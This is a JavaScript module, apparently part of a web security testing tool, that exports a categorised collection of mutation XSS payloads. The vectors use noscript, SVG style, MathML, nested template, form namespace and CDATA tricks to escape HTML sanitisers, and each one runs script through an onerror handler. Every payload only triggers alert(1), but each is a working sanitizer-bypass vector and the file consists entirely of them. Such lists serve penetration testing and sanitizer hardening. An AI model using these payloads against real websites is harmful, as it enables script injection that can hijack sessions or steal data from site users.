/**
 * @file mutation-xss.js
 * @description Mutation XSS (mXSS) payloads
 * @version 8.0.0
 */

(function() {
    'use strict';

    const MUTATION_XSS_PAYLOADS = {
        // ═══════════════════════════════════════════════════════════════
        // 🧬 innerHTML Mutations
        // ═══════════════════════════════════════════════════════════════
        innerHTML: [
            {
                id: 'mxss_001',
                payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                description: 'Noscript mXSS',
                severity: 'critical',
                contexts: ['html'],
                tags: ['mxss', 'noscript', 'mutation']
            },
            {
                id: 'mxss_002',
                payload: '<svg><style><img src=x onerror=alert(1)></style></svg>',
                description: 'SVG style mXSS',
                severity: 'critical',
                contexts: ['html'],
                tags: ['mxss', 'svg', 'style']
            },
            {
                id: 'mxss_003',
                payload: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->',
                description: 'MathML mXSS',
                severity: 'critical',
                contexts: ['html'],
                tags: ['mxss', 'mathml', 'mutation']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎨 Style Mutations
        // ═══════════════════════════════════════════════════════════════
        style: [
            {
                id: 'mxss_style_001',
                payload: '<style><style/><img src=x onerror=alert(1)>',
                description: 'Style tag mutation',
                severity: 'high',
                contexts: ['html'],
                tags: ['mxss', 'style', 'mutation']
            },
            {
                id: 'mxss_style_002',
                payload: '<svg><style><img src=x onerror=alert(1)></style>',
                description: 'SVG style escape',
                severity: 'high',
                contexts: ['html'],
                tags: ['mxss', 'svg', 'style', 'escape']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 📋 Template Mutations
        // ═══════════════════════════════════════════════════════════════
        template: [
            {
                id: 'mxss_tmpl_001',
                payload: '<template><s><template><s></template><img src=x onerror=alert(1)>',
                description: 'Nested template mXSS',
                severity: 'high',
                contexts: ['html'],
                tags: ['mxss', 'template', 'nested']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔄 Form Mutations
        // ═══════════════════════════════════════════════════════════════
        form: [
            {
                id: 'mxss_form_001',
                payload: '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)></style></mglyph></form>',
                description: 'Form namespace confusion mXSS',
                severity: 'critical',
                contexts: ['html'],
                tags: ['mxss', 'form', 'namespace']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Namespace Confusion
        // ═══════════════════════════════════════════════════════════════
        namespace: [
            {
                id: 'mxss_ns_001',
                payload: '<svg><![CDATA[<image xlink:href="]]><img src=x onerror=alert(1)//">',
                description: 'CDATA namespace confusion',
                severity: 'high',
                contexts: ['html'],
                tags: ['mxss', 'namespace', 'cdata', 'svg']
            }
        ]
    };

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 Export
    // ═══════════════════════════════════════════════════════════════════
    exports.MUTATION_XSS_PAYLOADS = MUTATION_XSS_PAYLOADS;
    exports.getPayloads = () => {
        const all = [];
        for (const category in MUTATION_XSS_PAYLOADS) {
            all.push(...MUTATION_XSS_PAYLOADS[category]);
        }
        return all;
    };
})();